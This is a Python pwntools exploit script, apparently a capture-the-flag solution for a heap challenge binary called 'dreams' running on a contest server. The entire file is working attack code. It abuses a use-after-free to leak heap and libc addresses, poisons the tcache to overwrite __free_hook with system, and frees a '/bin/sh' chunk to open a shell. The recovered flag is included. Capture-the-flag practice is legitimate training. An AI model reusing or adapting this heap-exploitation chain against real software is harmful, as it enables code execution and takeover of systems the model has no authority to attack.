#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.actf.co --port 31227 dreams
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('dreams')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31227)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x4013a4
b *0x4014ff
b psychiatrist
#b *0x40162a
#b *0x401597
#b *0x401583
#b *0x401579
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def go_sleep(page, date, content):
    io.sendline(b'1')
    io.sendlineafter(b'dream? ', page)
    io.sendafter(b'? ', date)
    io.sendafter(b'about? ', content)

def sell(page):
    io.sendline(b'2')
    io.sendline(page)


def psych(page, date):
    io.sendline(b'3')
    io.sendline(page)
    io.recvuntil(b'that ')
    leak = int.from_bytes(io.recvline().rstrip(), 'little')
    io.sendafter(b'New date: ', date)
    return leak



go_sleep(b'0', b'lmao', b'A'*0x14)
sell(b'0')
leak = psych(b'0', p64(0xdeadbeef))

print(hex(leak))
print(hex(psych(b'0', p64(leak+656))))
print(hex(psych(b'520', p64(0x404010))))

libcleak = (psych(b'0', p64(0x20)))
print('libc leak: ', hex(libcleak))
libcbase = libcleak - 0x1ed6a0
print('libc base: ', hex(libcbase))

freehook = libcbase + 0x1eee48
print('freehook: ', hex(freehook))

system = libcbase + 0x522c0

go_sleep(b'1', b'A'*8, b'a'*0x14)
go_sleep(b'2', b'B'*8, b'b'*0x14)
sell(b'1')
sell(b'2')

print(hex(psych(b'2', p64(freehook))))

go_sleep(b'3', b'/bin/sh\x00', b'b'*0x14)
go_sleep(b'4', p64(system), b'd'*0x14)

sell(b'3')

#actf{hav3_you_4ny_dreams_y0u'd_like_to_s3ll?_cb72f5211336}

io.interactive()

